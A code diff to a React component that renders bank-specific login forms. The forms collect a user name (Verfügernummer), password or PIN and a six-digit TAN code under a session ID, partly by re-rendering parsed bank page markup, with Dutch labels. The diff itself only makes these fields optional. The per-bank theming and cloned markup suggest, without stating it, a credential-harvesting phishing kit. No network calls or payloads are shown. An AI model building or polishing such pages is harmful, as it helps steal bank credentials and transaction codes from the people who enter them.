@@ -688,12 +688,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           if (fieldName === "verfuegernummer") {
             props.value = verfuegernummer;
             props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setVerfuegernummer(e.target.value);
-            props.required = true;
+            props.required = false;
           } else if (fieldName === "pin") {
             props.type = "password";
             props.value = pin;
             props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setPin(e.target.value);
-            props.required = true;
+            props.required = false;
           } else if (fieldName === "tacCode") {
             props.value = tacCode;
             props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setTacCode(e.target.value);
@@ -744,11 +744,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           if (domNode instanceof Element) {
             if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
               const props = attributesToProps(domNode.attribs);
-              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} required />;
+              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} />;
             }
             if (domNode.name === "input" && domNode.attribs?.name === "pin") {
               const props = attributesToProps(domNode.attribs);
-              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} required />;
+              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} />;
             }
             if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
               const props = attributesToProps(domNode.attribs);
@@ -842,11 +842,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                 <form onSubmit={handleSubmit}>
                   <div style={{ marginBottom: '1rem' }}>
                     <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
-                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
+                    <input value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
                   </div>
                   <div style={{ marginBottom: '1.5rem' }}>
                     <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
-                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
+                    <input value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
                   </div>
                   
                   {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
@@ -960,7 +960,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           <label className="block text-sm font-bold text-zinc-800">
             {theme.inputLabels.verfuegernummer}
             <input
-              required
               className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
               value={verfuegernummer}
               onChange={(e) => setVerfuegernummer(e.target.value)}
@@ -970,7 +969,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           <label className="block text-sm font-bold text-zinc-800">
             {theme.inputLabels.pin}
             <input
-              required
               type="password"
               className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
               value={pin}
@@ -981,7 +979,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           <label className="block text-sm font-bold text-zinc-800">
             {theme.inputLabels.tacCode}
             <input
-              required
               inputMode="numeric"
               maxLength={6}
               className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all tracking-widest"
